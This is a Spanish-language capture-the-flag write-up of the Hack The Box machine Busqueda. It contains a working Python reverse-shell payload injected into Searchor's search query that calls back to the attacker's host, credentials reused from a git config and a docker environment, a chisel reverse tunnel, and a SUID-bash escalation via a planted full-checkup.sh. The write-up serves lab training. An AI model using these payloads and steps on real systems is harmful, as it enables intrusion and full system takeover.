---
layout: post
title: Busqueda
date: 2023-08-12
description:
img:
fig-caption:
tags: []
---
___

<center><img src="/writeups/assets/img/Busqueda-htb/Busqueda.png" alt="" style="height: 394px; width:520px;"></center>

***

# Conocimientos



***

# Reconocimiento

## Escaneo de puertos con nmap

### Descubrimiento de puertos abiertos

```null
nmap -p- --open --min-rate 5000 -n -Pn -sS 10.10.11.208 -oG openports
Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-02 09:52 GMT
Nmap scan report for 10.10.11.208
Host is up (0.12s latency).
Not shown: 65507 closed tcp ports (reset), 26 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 17.11 seconds
```

### Escaneo de versión y servicios de cada puerto

```null
nmap -sCV -p22,80 10.10.11.208 -oN portscan
Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-02 09:52 GMT
Nmap scan report for 10.10.11.208
Host is up (0.054s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 4fe3a667a227f9118dc30ed773a02c28 (ECDSA)
|_  256 816e78766b8aea7d1babd436b7f8ecc4 (ED25519)
80/tcp open  http    Apache httpd 2.4.52
|_http-server-header: Apache/2.4.52 (Ubuntu)
|_http-title: Did not follow redirect to http://searcher.htb/
Service Info: Host: searcher.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 11.07 seconds
```

Añado el dominio ```searcher.htb``` al ```/etc/hosts```

## Puerto 80 (HTTP)

Con ```whatweb``` analizo las tecnologías que utiliza el servidor web

```null
whatweb http://10.10.11.208
http://10.10.11.208 [302 Found] Apache[2.4.52], Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][Apache/2.4.52 (Ubuntu)], IP[10.10.11.208], RedirectLocation[http://searcher.htb/], Title[302 Found]
http://searcher.htb/ [200 OK] Bootstrap[4.1.3], Country[RESERVED][ZZ], HTML5, HTTPServer[Werkzeug/2.1.2 Python/3.10.6], IP[10.10.11.208], JQuery[3.2.1], Python[3.10.6], Script, Title[Searcher], Werkzeug[2.1.2]
```

<img src="/writeups/assets/img/Busqueda-htb/1.png" alt="">

Se está empleando ```Searchor 2.4.0```

<img src="/writeups/assets/img/Busqueda-htb/2.png" alt="">

Es vulnerable a RCE. En este [artículo](https://security.snyk.io/package/pip/searchor/2.4.0) está detallada su explotación. En este [POC](https://github.com/jonnyzar/POC-Searchor-2.4.2) detallan como explotarlo

Inyecto el payload


```null
POST /search HTTP/1.1
Host: searcher.htb
Content-Length: 112
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://searcher.htb
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://searcher.htb/
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: close

engine=AlternativeTo&query=', exec("import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('10.10.16.15',443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(['/bin/sh','-i']);"))#
```

Gano acceso al sistema en una sesión de ```netcat```

```null
nc -nlvp 443
listening on [any] 443 ...
connect to [10.10.16.15] from (UNKNOWN) [10.10.11.208] 52210
/bin/sh: 0: can't access tty; job control turned off
$ script /dev/null -c bash
Script started, output log file is '/dev/null'.
svc@busqueda:/var/www/app$ ^Z
zsh: suspended  nc -nlvp 443
❯ stty raw -echo; fg
[1]  + continued  nc -nlvp 443
                              reset xterm
svc@busqueda:/var/www/app$ export TERM=xterm
svc@busqueda:/var/www/app$ export SHELL=bash
svc@busqueda:/var/www/app$ stty rows 55 columns 209
``` 

Puedo ver la primera flag

```null
svc@busqueda:~$ cat user.txt 
9db07fb3a44ab64c9cbcc78af369f0c3
```

# Escalada

El directorio ```/var/www/app``` corresponde a un repositorio GIT

```null
svc@busqueda:/var/www/app$ ls -la
total 20
drwxr-xr-x 4 www-data www-data 4096 Apr  3 14:32 .
drwxr-xr-x 4 root     root     4096 Apr  4 16:02 ..
-rw-r--r-- 1 www-data www-data 1124 Dec  1  2022 app.py
drwxr-xr-x 8 www-data www-data 4096 Jun  2 10:16 .git
drwxr-xr-x 2 www-data www-data 4096 Dec  1  2022 templates
```

Se exponen credenciales en texto claro

```null
svc@busqueda:/var/www/app/.git$ cat config 
[core]
	repositoryformatversion = 0
	filemode = true
	bare = false
	logallrefupdates = true
[remote "origin"]
	url = http://cody:jh1usoih2bkjaspwe92@gitea.searcher.htb/cody/Searcher_site.git
	fetch = +refs/heads/*:refs/remotes/origin/*
[branch "main"]
	remote = origin
	merge = refs/heads/main
```

Se reutilizan para este usuario y puedo ver un privilegio a nivel de sudoers

```null
svc@busqueda:~$ sudo -l
[sudo] password for svc: 
Matching Defaults entries for svc on busqueda:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User svc may run the following commands on busqueda:
    (root) /usr/bin/python3 /opt/scripts/system-checkup.py *
```

No puedo leer lo que hace ni modificar su contenido

```null
cat: /opt/scripts/system-checkup.py: Permission denied
svc@busqueda:~$ ls -la /opt/scripts/system-checkup.py
-rwx--x--x 1 root root 1903 Dec 24 21:23 /opt/scripts/system-checkup.py
```

Pero al ejecutarlo me sale un panel de ayuda

```null
svc@busqueda:~$ sudo /usr/bin/python3 /opt/scripts/system-checkup.py *
Usage: /opt/scripts/system-checkup.py <action> (arg1) (arg2)

     docker-ps     : List running docker containers
     docker-inspect : Inpect a certain docker container
     full-checkup  : Run a full system checkup
```

Hay dos contenedores desplegados

```null
svc@busqueda:~$ sudo /usr/bin/python3 /opt/scripts/system-checkup.py docker-ps
CONTAINER ID   IMAGE                COMMAND                  CREATED        STATUS          PORTS                                             NAMES
960873171e2e   gitea/gitea:latest   "/usr/bin/entrypoint…"   4 months ago   Up 12 minutes   127.0.0.1:3000->3000/tcp, 127.0.0.1:222->22/tcp   gitea
f84a6b33fb5a   mysql:8              "docker-entrypoint.s…"   4 months ago   Up 12 minutes   127.0.0.1:3306->3306/tcp, 33060/tcp               mysql_db
```

Al intentar exportar los datos en ```JSON``` no aparece nada

```null
svc@busqueda:/var/www/app/.git$ sudo python3 /opt/scripts/system-checkup.py docker-inspect --format='json' mysql_db
--format=json
```

Con un par de corchetes también

```null
svc@busqueda:/var/www/app/.git$ sudo python3 /opt/scripts/system-checkup.py docker-inspect --format='{json}' mysql_db
--format={json}
```

Pero con dos aparece un error

```null
svc@busqueda:/var/www/app/.git$ sudo python3 /opt/scripts/system-checkup.py docker-inspect --format='{{json}}' mysql_db
template parsing error: template: :1:11: executing "" at <json>: wrong number of args for json: want 1 got 0
```

Espera que se le solicite un campo. Uno típico a probar el ```Config```, aunque se puede fuzzear

```null
svc@busqueda:/var/www/app/.git$ sudo python3 /opt/scripts/system-checkup.py docker-inspect --format='{{json .Config}}' mysql_db
--format={"Hostname":"f84a6b33fb5a","Domainname":"","User":"","AttachStdin":false,"AttachStdout":false,"AttachStderr":false,"ExposedPorts":{"3306/tcp":{},"33060/tcp":{}},"Tty":false,"OpenStdin":false,"StdinOnce":false,"Env":["MYSQL_ROOT_PASSWORD=jI86kGUuj87guWr3RyF","MYSQL_USER=gitea","MYSQL_PASSWORD=yuiu1hoiu4i5ho1uh","MYSQL_DATABASE=gitea","PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin","GOSU_VERSION=1.14","MYSQL_MAJOR=8.0","MYSQL_VERSION=8.0.31-1.el8","MYSQL_SHELL_VERSION=8.0.31-1.el8"],"Cmd":["mysqld"],"Image":"mysql:8","Volumes":{"/var/lib/mysql":{}},"WorkingDir":"","Entrypoint":["docker-entrypoint.sh"],"OnBuild":null,"Labels":{"com.docker.compose.config-hash":"1b3f25a702c351e42b82c1867f5761829ada67262ed4ab55276e50538c54792b","com.docker.compose.container-number":"1","com.docker.compose.oneoff":"False","com.docker.compose.project":"docker","com.docker.compose.project.config_files":"docker-compose.yml","com.docker.compose.project.working_dir":"/root/scripts/docker","com.docker.compose.service":"db","com.docker.compose.version":"1.29.2"}}
```

El puerto 3000 está abierto internamente

```null
svc@busqueda:~$ ss -nltp
State             Recv-Q            Send-Q                       Local Address:Port                         Peer Address:Port            Process                                                                 
LISTEN            0                 4096                             127.0.0.1:222                               0.0.0.0:*                                                                                       
LISTEN            0                 4096                             127.0.0.1:39459                             0.0.0.0:*                                                                                       
LISTEN            0                 128                              127.0.0.1:5000                              0.0.0.0:*                users:(("python3",pid=1670,fd=6),("python3",pid=1670,fd=4))            
LISTEN            0                 4096                             127.0.0.1:3306                              0.0.0.0:*                                                                                       
LISTEN            0                 4096                         127.0.0.53%lo:53                                0.0.0.0:*                                                                                       
LISTEN            0                 128                                0.0.0.0:22                                0.0.0.0:*                                                                                       
LISTEN            0                 4096                             127.0.0.1:3000                              0.0.0.0:*                                                                                       
LISTEN            0                 511                                      *:80                                      *:*                                                                                       
LISTEN            0                 128                                   [::]:22                                   [::]:*                                                                                       
svc@busqueda:~$ 
```

Utilizo el ```chisel``` para aplicar ```Remote Port Forwarding```. En mi equipo lo ejecuto como servidor

```null
chisel server -p 1234 --reverse
2023/06/02 10:39:16 server: Reverse tunnelling enabled
2023/06/02 10:39:16 server: Fingerprint sfdHwMX88RAObnCNtni3uZMOTr28FTeC37OvOSmiL5o=
2023/06/02 10:39:16 server: Listening on http://0.0.0.0:1234
```

En la máquina víctima como cliente

```null
svc@busqueda:/tmp$ ./chisel client 10.10.16.15:1234 R:socks &>/dev/null & disown
```

Las credenciales ```administrator:yuiu1hoiu4i5ho1uh``` se reutilizan para el Gitea

<img src="/writeups/assets/img/Busqueda-htb/3.png" alt="">

En uno de ellos se encuentra el ```system-checkup.py```

<img src="/writeups/assets/img/Busqueda-htb/4.png" alt="">

Su contenido es el siguiente

```null
#!/bin/bash
import subprocess
import sys

actions = ['full-checkup', 'docker-ps','docker-inspect']

def run_command(arg_list):
    r = subprocess.run(arg_list, capture_output=True)
    if r.stderr:
        output = r.stderr.decode()
    else:
        output = r.stdout.decode()

    return output


def process_action(action):
    if action == 'docker-inspect':
        try:
            _format = sys.argv[2]
            if len(_format) == 0:
                print(f"Format can't be empty")
                exit(1)
            container = sys.argv[3]
            arg_list = ['docker', 'inspect', '--format', _format, container]
            print(run_command(arg_list)) 
        
        except IndexError:
            print(f"Usage: {sys.argv[0]} docker-inspect <format> <container_name>")
            exit(1)
    
        except Exception as e:
            print('Something went wrong')
            exit(1)
    
    elif action == 'docker-ps':
        try:
            arg_list = ['docker', 'ps']
            print(run_command(arg_list)) 
        
        except:
            print('Something went wrong')
            exit(1)

    elif action == 'full-checkup':
        try:
            arg_list = ['./full-checkup.sh']
            print(run_command(arg_list))
            print('[+] Done!')
        except:
            print('Something went wrong')
            exit(1)
            

if __name__ == '__main__':

    try:
        action = sys.argv[1]
        if action in actions:
            process_action(action)
        else:
            raise IndexError

    except IndexError:
        print(f'Usage: {sys.argv[0]} <action> (arg1) (arg2)')
        print('')
        print('     docker-ps     : List running docker containers')
        print('     docker-inspect : Inpect a certain docker container')
        print('     full-checkup  : Run a full system checkup')
        print('')
        exit(1)

```

Puedo llegar a ejecutar un script en bash llamado ```full-checkup.sh```. Lo creo en ```/tmp``` para asignarle el SUID a la ```bash```

```null
#!/bin/bash
chmod u+s /bin/bash
```

Puedo ver la segunda flag

```null
svc@busqueda:/tmp$ sudo /usr/bin/python3 /opt/scripts/system-checkup.py full-checkup

[+] Done!
svc@busqueda:/tmp$ ls -l /bin/bash
-rwsr-xr-x 1 root root 1396520 Jan  6  2022 /bin/bash
svc@busqueda:/tmp$ bash -p
bash-5.1# cat /root/root.txt
59b01d7435b6c3d96169c98af0e1c759
```